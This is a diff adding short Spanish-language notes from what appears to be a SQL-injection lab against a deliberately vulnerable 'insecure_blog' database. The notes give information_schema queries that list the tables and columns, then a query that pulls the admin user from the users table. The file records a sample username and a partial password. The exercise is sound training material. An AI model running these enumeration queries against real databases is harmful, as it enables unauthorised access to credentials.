@@ -1,0 +1,29 @@
+1.
+Base de datos: 
+- insecure_blog
+
+2. 
+Recuperar todas las tablas de la base de datos INSECURE_BLOG:
+SELECT distinct(table_name) FROM information_schema.columns WHERE table_schema = 'insecure_blog' LIMIT 0,1
+
+Tablas:
+- comments
+- posts
+- users
+
+3.
+Recuperar todas las columnas de la tabla USERS:
+SELECT column_name FROM information_schema.columns WHERE table_name = 'users' AND table_schema = 'insecure_blog' LIMIT 0,1
+
+Campos:
+- id
+- username: gonzalo
+- password: sarasa...
+- isAdmin (true/false 1/0)
+- ...
+
+4.
+Recuperar usuario y contraseña del ADMIN:
+SELECT username FROM users WHERE isAdmin=1
+
+
